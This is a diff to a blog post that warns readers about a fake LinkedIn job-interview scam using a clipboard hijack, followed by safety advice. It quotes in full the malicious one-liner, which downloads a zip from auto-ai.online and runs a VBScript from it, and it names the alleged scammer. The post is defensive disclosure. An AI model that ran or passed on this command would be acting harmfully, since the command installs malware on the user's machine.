@@ -70,28 +70,30 @@ THAT'S A BIG FAT NO-NO for anyone reading this to open a terminal and run some c
 
 `curl -k -o "%TEMP%\fixed.zip" "https://auto-ai.online/cam-v-257.fix" && powershell -Command "Expand-Archive -Force -Path '%TEMP%\fixed.zip' -DestinationPath '%TEMP%\fixed'" && wscript "%TEMP%\fixed\update.vbs"`
 
-Now that my friends, looks sus af.
+Now that my friends, looks sus af 🚨.
 
-That's the scam. A clipboard hijack to "fix your drivers" which would download a zipped payload from auto-ai.online and run on your machine. If you want to get into the weeds of what the actual attack might be, then read o below in the [Technical Details](#technical-details)
+That's the scam. A clipboard hijack to "fix your drivers" which would download a zipped payload from a remote server auto-ai.online and run on your machine. 
+
+If you want to get into the weeds of what the actual attack might be, then read on below in the [Technical Details](#technical-details)
 
 # Final Words
 
-As of now the profile of our LinkedIn Premium member / aspiring scammer [Aftab Habib](https://www.linkedin.com/in/aftab-habib-965479297/) is still up. I presume he'll block me immediately upon seeing this. I plan to report his profile to LinkedIn, report to [Galaxy Digital](https://www.linkedin.com/company/galaxyhq) that there are scammers impersonating their staff. Lastly I plan to report his bogus registrations to Hostinger see how they respond.
+As of now the profile of our LinkedIn Premium member / aspiring scammer [Aftab Habib](https://www.linkedin.com/in/aftab-habib-965479297/) is still up. I presume he'll block me immediately upon seeing this. I plan to report his profile to LinkedIn, report to [Galaxy Digital](https://www.linkedin.com/company/galaxyhq) that there are scammers impersonating their staff (doubt it'll be news to them, however). Lastly, I plan to report his bogus registrations to Hostinger see how they respond.
 
 If you can think of anything else I should be doing, please do let me know! I really wish I could've scheduled a video call with Aftab to have a lovely chat about his operation.
 
-Now if you're read this far, read this section too:
+Now if you've read this far, read this section too:
 
 # How To Keep Yourself Safe
 
-This is some general advise I can give you that would be relevant in any online interaction.
+This is some general advise I can give you that would be relevant in any online interaction nowadays:
 
-- NEVER copy/paste commands from anyone. Period. If you must, type it in after you thoroughly read it. Even running it through an LLM would be a good idea to make sure you didn't miss anything.
+- NEVER copy/paste commands from anyone. Period. If you must, type it in after you thoroughly inspect it. Also running it through an LLM would be a good idea to make sure you didn't miss anything.
 - If someone is reaching out to you on an open platform like LinkedIn or X where any monkey can open an account, only respond if they're able to email you from a legitimate corporate email account. Email headers are spoofable as well, but it's a bit more difficult and would be almost impossible to have a back and forth conversation via email.
 - Use reputable job platforms and verify company legitimacy. Check the company's website for the actual opening instead of accepting documents or job postings in messages.
-- Be extremely suspicious of "driver updates" or "software installations" during interviews. Read a cautionary tale [here](https://slowmist.medium.com/seeing-is-deceiving-analysis-of-fake-zoom-meeting-phishing-attack-3b0138e13e49)
+- Be extremely suspicious of "driver updates" or "software installations" during interviews. Read a cautionary tale [here](https://slowmist.medium.com/seeing-is-deceiving-analysis-of-fake-zoom-meeting-phishing-attack-3b0138e13e49).
 
-"Hacking" used to be predominantly finding vulnerabilities in vulnerable servers. Now it seems that social engineering is a huge part of the attack surface. I am generally super paranoid, but I can see that with some more sophistication even I could've possibly slipped at some point. Especially now as audio/video can be faked with AI you need to be super suspicious of interaction even with people you think you know.
+"Hacking" used to be predominantly finding vulnerabilities in servers or locally accessible mal-configured devices. Now it seems that social engineering is a huge part of the attack surface. I am generally super paranoid, but I can see that with some more sophistication even I could've possibly slipped at some point. Especially now as audio/video can be faked with AI you need to be super suspicious of interaction even with people you think you know.
 
 # Technical Details
 
